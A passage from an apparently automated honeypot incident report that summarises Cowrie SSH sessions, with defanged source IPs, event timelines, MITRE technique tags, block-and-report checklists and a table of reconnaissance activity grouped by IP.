| `2026-06-30 06:29:05` | `cowrie.login.success` |
| `2026-06-30 06:29:06` | `cowrie.login.success` |
| `2026-06-30 06:29:06` | `cowrie.session.params` |
| `2026-06-30 06:29:07` | `cowrie.command.input` |
| `2026-06-30 06:29:07` | `cowrie.command.failed` |
| `2026-06-30 06:29:07` | `cowrie.command.input` |
| `2026-06-30 06:29:07` | `cowrie.command.failed` |
| `2026-06-30 06:29:07` | `cowrie.command.input` |
| `2026-06-30 06:29:07` | `cowrie.command.input` |
| `2026-06-30 06:29:07` | `cowrie.command.failed` |
| `2026-06-30 06:29:07` | `cowrie.command.failed` |
| `2026-06-30 06:29:38` | `cowrie.log.closed` |
| `2026-06-30 06:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e655cfd5faf4

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:29 |
| **Last Seen** | 2026-06-30 06:30 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:29:38` | `cowrie.session.connect` |
| `2026-06-30 06:29:39` | `cowrie.login.success` |
| `2026-06-30 06:29:39` | `cowrie.session.params` |
| `2026-06-30 06:29:40` | `cowrie.command.input` |
| `2026-06-30 06:29:40` | `cowrie.command.failed` |
| `2026-06-30 06:29:40` | `cowrie.command.input` |
| `2026-06-30 06:29:40` | `cowrie.command.failed` |
| `2026-06-30 06:29:41` | `cowrie.command.input` |
| `2026-06-30 06:29:41` | `cowrie.command.failed` |
| `2026-06-30 06:29:41` | `cowrie.command.input` |
| `2026-06-30 06:29:41` | `cowrie.command.failed` |
| `2026-06-30 06:29:41` | `cowrie.command.input` |
| `2026-06-30 06:29:41` | `cowrie.command.input` |
| `2026-06-30 06:29:41` | `cowrie.command.failed` |
| `2026-06-30 06:29:41` | `cowrie.command.failed` |
| `2026-06-30 06:30:12` | `cowrie.log.closed` |
| `2026-06-30 06:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ebf3a88342

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 06:29 |
| **Last Seen** | 2026-06-30 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:29:59` | `cowrie.session.connect` |
| `2026-06-30 06:29:59` | `cowrie.client.version` |
| `2026-06-30 06:29:59` | `cowrie.client.kex` |
| `2026-06-30 06:30:00` | `cowrie.login.success` |
| `2026-06-30 06:30:00` | `cowrie.session.params` |
| `2026-06-30 06:30:00` | `cowrie.command.input` |
| `2026-06-30 06:30:00` | `cowrie.log.closed` |
| `2026-06-30 06:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1087aed7e80b

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:30 |
| **Last Seen** | 2026-06-30 06:30 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:30:12` | `cowrie.session.connect` |
| `2026-06-30 06:30:13` | `cowrie.login.success` |
| `2026-06-30 06:30:14` | `cowrie.session.params` |
| `2026-06-30 06:30:14` | `cowrie.command.input` |
| `2026-06-30 06:30:14` | `cowrie.command.failed` |
| `2026-06-30 06:30:14` | `cowrie.command.input` |
| `2026-06-30 06:30:14` | `cowrie.command.failed` |
| `2026-06-30 06:30:14` | `cowrie.command.input` |
| `2026-06-30 06:30:14` | `cowrie.command.failed` |
| `2026-06-30 06:30:15` | `cowrie.command.input` |
| `2026-06-30 06:30:15` | `cowrie.command.failed` |
| `2026-06-30 06:30:15` | `cowrie.command.input` |
| `2026-06-30 06:30:15` | `cowrie.command.input` |
| `2026-06-30 06:30:15` | `cowrie.command.failed` |
| `2026-06-30 06:30:15` | `cowrie.command.failed` |
| `2026-06-30 06:30:46` | `cowrie.log.closed` |
| `2026-06-30 06:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c47ddbde136

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:30 |
| **Last Seen** | 2026-06-30 06:31 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:30:47` | `cowrie.session.connect` |
| `2026-06-30 06:30:48` | `cowrie.login.success` |
| `2026-06-30 06:30:49` | `cowrie.session.params` |
| `2026-06-30 06:30:49` | `cowrie.command.input` |
| `2026-06-30 06:30:49` | `cowrie.command.failed` |
| `2026-06-30 06:30:49` | `cowrie.command.input` |
| `2026-06-30 06:30:49` | `cowrie.command.failed` |
| `2026-06-30 06:30:50` | `cowrie.command.input` |
| `2026-06-30 06:30:50` | `cowrie.command.failed` |
| `2026-06-30 06:30:50` | `cowrie.command.input` |
| `2026-06-30 06:30:50` | `cowrie.command.failed` |
| `2026-06-30 06:30:51` | `cowrie.command.input` |
| `2026-06-30 06:30:51` | `cowrie.command.input` |
| `2026-06-30 06:30:51` | `cowrie.command.failed` |
| `2026-06-30 06:30:51` | `cowrie.command.failed` |
| `2026-06-30 06:31:21` | `cowrie.log.closed` |
| `2026-06-30 06:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb38ac4adea

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:31 |
| **Last Seen** | 2026-06-30 06:31 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:31:21` | `cowrie.session.connect` |
| `2026-06-30 06:31:22` | `cowrie.login.success` |
| `2026-06-30 06:31:23` | `cowrie.login.success` |
| `2026-06-30 06:31:23` | `cowrie.session.params` |
| `2026-06-30 06:31:24` | `cowrie.command.input` |
| `2026-06-30 06:31:24` | `cowrie.command.failed` |
| `2026-06-30 06:31:24` | `cowrie.command.input` |
| `2026-06-30 06:31:24` | `cowrie.command.failed` |
| `2026-06-30 06:31:24` | `cowrie.command.input` |
| `2026-06-30 06:31:24` | `cowrie.command.input` |
| `2026-06-30 06:31:24` | `cowrie.command.failed` |
| `2026-06-30 06:31:24` | `cowrie.command.failed` |
| `2026-06-30 06:31:55` | `cowrie.log.closed` |
| `2026-06-30 06:31:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980f904526ae

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:31 |
| **Last Seen** | 2026-06-30 06:32 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:31:55` | `cowrie.session.connect` |
| `2026-06-30 06:31:56` | `cowrie.login.success` |
| `2026-06-30 06:31:57` | `cowrie.login.success` |
| `2026-06-30 06:31:57` | `cowrie.session.params` |
| `2026-06-30 06:31:58` | `cowrie.command.input` |
| `2026-06-30 06:31:58` | `cowrie.command.failed` |
| `2026-06-30 06:31:58` | `cowrie.command.input` |
| `2026-06-30 06:31:58` | `cowrie.command.failed` |
| `2026-06-30 06:31:58` | `cowrie.command.input` |
| `2026-06-30 06:31:58` | `cowrie.command.input` |
| `2026-06-30 06:31:59` | `cowrie.command.failed` |
| `2026-06-30 06:31:59` | `cowrie.command.failed` |
| `2026-06-30 06:32:29` | `cowrie.log.closed` |
| `2026-06-30 06:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a0747ba33c

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:32 |
| **Last Seen** | 2026-06-30 06:33 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:32:29` | `cowrie.session.connect` |
| `2026-06-30 06:32:30` | `cowrie.login.success` |
| `2026-06-30 06:32:31` | `cowrie.login.success` |
| `2026-06-30 06:32:31` | `cowrie.session.params` |
| `2026-06-30 06:32:32` | `cowrie.command.input` |
| `2026-06-30 06:32:32` | `cowrie.command.failed` |
| `2026-06-30 06:32:32` | `cowrie.command.input` |
| `2026-06-30 06:32:32` | `cowrie.command.failed` |
| `2026-06-30 06:32:32` | `cowrie.command.input` |
| `2026-06-30 06:32:32` | `cowrie.command.input` |
| `2026-06-30 06:32:32` | `cowrie.command.failed` |
| `2026-06-30 06:32:32` | `cowrie.command.failed` |
| `2026-06-30 06:33:03` | `cowrie.log.closed` |
| `2026-06-30 06:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec34c5c46dd1

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:33 |
| **Last Seen** | 2026-06-30 06:33 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:33:03` | `cowrie.session.connect` |
| `2026-06-30 06:33:04` | `cowrie.login.success` |
| `2026-06-30 06:33:04` | `cowrie.session.params` |
| `2026-06-30 06:33:05` | `cowrie.command.input` |
| `2026-06-30 06:33:05` | `cowrie.command.failed` |
| `2026-06-30 06:33:05` | `cowrie.command.input` |
| `2026-06-30 06:33:05` | `cowrie.command.failed` |
| `2026-06-30 06:33:06` | `cowrie.command.input` |
| `2026-06-30 06:33:06` | `cowrie.command.failed` |
| `2026-06-30 06:33:06` | `cowrie.command.input` |
| `2026-06-30 06:33:06` | `cowrie.command.failed` |
| `2026-06-30 06:33:06` | `cowrie.command.input` |
| `2026-06-30 06:33:06` | `cowrie.command.input` |
| `2026-06-30 06:33:06` | `cowrie.command.failed` |
| `2026-06-30 06:33:06` | `cowrie.command.failed` |
| `2026-06-30 06:33:37` | `cowrie.log.closed` |
| `2026-06-30 06:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85bf2b40dc9

| Field | Detail |
|---|---|
| **Source IP** | `112.185.230[.]208` |
| **First Seen** | 2026-06-30 06:33 |
| **Last Seen** | 2026-06-30 06:34 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:33:37` | `cowrie.session.connect` |
| `2026-06-30 06:33:38` | `cowrie.login.success` |
| `2026-06-30 06:33:39` | `cowrie.session.params` |
| `2026-06-30 06:33:39` | `cowrie.command.input` |
| `2026-06-30 06:33:39` | `cowrie.command.failed` |
| `2026-06-30 06:33:39` | `cowrie.command.input` |
| `2026-06-30 06:33:39` | `cowrie.command.failed` |
| `2026-06-30 06:33:40` | `cowrie.command.input` |
| `2026-06-30 06:33:40` | `cowrie.command.failed` |
| `2026-06-30 06:33:40` | `cowrie.command.input` |
| `2026-06-30 06:33:40` | `cowrie.command.failed` |
| `2026-06-30 06:33:41` | `cowrie.command.input` |
| `2026-06-30 06:33:41` | `cowrie.command.input` |
| `2026-06-30 06:33:41` | `cowrie.command.failed` |
| `2026-06-30 06:33:41` | `cowrie.command.failed` |
| `2026-06-30 06:34:12` | `cowrie.log.closed` |
| `2026-06-30 06:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.185.230[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.185.230[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89558c672586

| Field | Detail |
|---|---|
| **Source IP** | `167.233.84[.]171` |
| **First Seen** | 2026-06-30 06:35 |
| **Last Seen** | 2026-06-30 06:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:35:33` | `cowrie.session.connect` |
| `2026-06-30 06:35:33` | `cowrie.client.version` |
| `2026-06-30 06:35:33` | `cowrie.client.kex` |
| `2026-06-30 06:35:33` | `cowrie.login.success` |
| `2026-06-30 06:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.233.84[.]171` to AbuseIPDB if not already reported
- [ ] Block `167.233.84[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb75ef0a483d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 06:37 |
| **Last Seen** | 2026-06-30 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:37:37` | `cowrie.session.connect` |
| `2026-06-30 06:37:37` | `cowrie.client.version` |
| `2026-06-30 06:37:37` | `cowrie.client.kex` |
| `2026-06-30 06:37:38` | `cowrie.login.success` |
| `2026-06-30 06:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa28ff831543

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 06:37 |
| **Last Seen** | 2026-06-30 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:37:37` | `cowrie.session.connect` |
| `2026-06-30 06:37:37` | `cowrie.client.version` |
| `2026-06-30 06:37:38` | `cowrie.client.kex` |
| `2026-06-30 06:37:38` | `cowrie.login.success` |
| `2026-06-30 06:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371818c37c54

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 06:37 |
| **Last Seen** | 2026-06-30 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:37:38` | `cowrie.session.connect` |
| `2026-06-30 06:37:38` | `cowrie.client.version` |
| `2026-06-30 06:37:39` | `cowrie.client.kex` |
| `2026-06-30 06:37:39` | `cowrie.login.success` |
| `2026-06-30 06:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d9e08ba605b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 06:37 |
| **Last Seen** | 2026-06-30 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:37:39` | `cowrie.session.connect` |
| `2026-06-30 06:37:39` | `cowrie.client.version` |
| `2026-06-30 06:37:39` | `cowrie.client.kex` |
| `2026-06-30 06:37:40` | `cowrie.login.success` |
| `2026-06-30 06:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632114da0b2f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 06:39 |
| **Last Seen** | 2026-06-30 06:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:39:05` | `cowrie.session.connect` |
| `2026-06-30 06:39:07` | `cowrie.client.version` |
| `2026-06-30 06:39:07` | `cowrie.client.kex` |
| `2026-06-30 06:39:12` | `cowrie.login.success` |
| `2026-06-30 06:39:16` | `cowrie.session.params` |
| `2026-06-30 06:39:16` | `cowrie.command.input` |
| `2026-06-30 06:39:18` | `cowrie.log.closed` |
| `2026-06-30 06:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf61938d071f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 06:42 |
| **Last Seen** | 2026-06-30 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:42:58` | `cowrie.session.connect` |
| `2026-06-30 06:42:58` | `cowrie.client.version` |
| `2026-06-30 06:42:58` | `cowrie.client.kex` |
| `2026-06-30 06:42:59` | `cowrie.login.success` |
| `2026-06-30 06:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c491d5e059

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-30 06:42 |
| **Last Seen** | 2026-06-30 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:42:58` | `cowrie.session.connect` |
| `2026-06-30 06:42:58` | `cowrie.client.version` |
| `2026-06-30 06:42:58` | `cowrie.client.kex` |
| `2026-06-30 06:42:59` | `cowrie.login.success` |
| `2026-06-30 06:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc85075fcc51

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 06:43 |
| **Last Seen** | 2026-06-30 06:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:43:26` | `cowrie.session.connect` |
| `2026-06-30 06:43:27` | `cowrie.client.version` |
| `2026-06-30 06:43:27` | `cowrie.client.kex` |
| `2026-06-30 06:43:29` | `cowrie.login.success` |
| `2026-06-30 06:43:31` | `cowrie.session.params` |
| `2026-06-30 06:43:31` | `cowrie.command.input` |
| `2026-06-30 06:43:32` | `cowrie.log.closed` |
| `2026-06-30 06:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14349bdc9ca0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 06:51 |
| **Last Seen** | 2026-06-30 06:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 06:51:35` | `cowrie.session.connect` |
| `2026-06-30 06:51:36` | `cowrie.client.version` |
| `2026-06-30 06:51:36` | `cowrie.client.kex` |
| `2026-06-30 06:51:42` | `cowrie.login.success` |
| `2026-06-30 06:51:46` | `cowrie.session.params` |
| `2026-06-30 06:51:46` | `cowrie.command.input` |
| `2026-06-30 06:51:48` | `cowrie.log.closed` |
| `2026-06-30 06:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.99.74[.]35` | **170** | 2026-06-30 04:08 | 2026-06-30 04:23 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `159.65.233[.]253` | **5** | 2026-06-30 03:36 | 2026-06-30 05:20 | 3m | 0 | `T1592` | 🟢 LOW |
| `45.12.148[.]98` | **4** | 2026-06-30 04:19 | 2026-06-30 04:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.216[.]134` | **2** | 2026-06-30 06:26 | 2026-06-30 06:28 | 4m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]96` | **2** | 2026-06-30 05:41 | 2026-06-30 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]243` | **2** | 2026-06-30 04:52 | 2026-06-30 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]214` | **2** | 2026-06-30 02:59 | 2026-06-30 02:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | **2** | 2026-06-30 06:05 | 2026-06-30 06:15 | 1m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **2** | 2026-06-30 05:12 | 2026-06-30 05:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]213` | 1 | 2026-06-30 06:03 | 2026-06-30 06:04 | 43s | 0 | `T1592` | 🟢 LOW |
| `104.248.206[.]108` | 1 | 2026-06-30 04:59 | 2026-06-30 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.26.6[.]111` | 1 | 2026-06-30 02:56 | 2026-06-30 02:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.255[.]67` | 1 | 2026-06-30 03:03 | 2026-06-30 03:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]166` | 1 | 2026-06-30 03:10 | 2026-06-30 03:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]20` | 1 | 2026-06-30 03:24 | 2026-06-30 03:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.236.49[.]131` | 1 | 2026-06-30 05:52 | 2026-06-30 05:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.241.3[.]85` | 1 | 2026-06-30 03:13 | 2026-06-30 03:15 | 107s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]106` | 1 | 2026-06-30 05:54 | 2026-06-30 05:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]75` | 1 | 2026-06-30 03:39 | 2026-06-30 03:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.101[.]210` | 1 | 2026-06-30 04:19 | 2026-06-30 04:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `167.233.84[.]171` | 1 | 2026-06-30 04:14 | 2026-06-30 04:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.176.31[.]228` | 1 | 2026-06-30 04:27 | 2026-06-30 04:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]234` | 1 | 2026-06-30 04:59 | 2026-06-30 05:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `203.189.221[.]17` | 1 | 2026-06-30 05:41 | 2026-06-30 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]212` | 1 | 2026-06-30 02:59 | 2026-06-30 02:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]213` | 1 | 2026-06-30 02:59 | 2026-06-30 02:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]221` | 1 | 2026-06-30 02:59 | 2026-06-30 02:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]222` | 1 | 2026-06-30 02:59 | 2026-06-30 02:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.0.56[.]78` | 1 | 2026-06-30 03:15 | 2026-06-30 03:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]101` | 1 | 2026-06-30 05:55 | 2026-06-30 05:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.185.50[.]192` | 1 | 2026-06-30 04:35 | 2026-06-30 04:36 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.143.50[.]224` | 1 | 2026-06-30 03:18 | 2026-06-30 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-06-30 04:08 | 2026-06-30 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
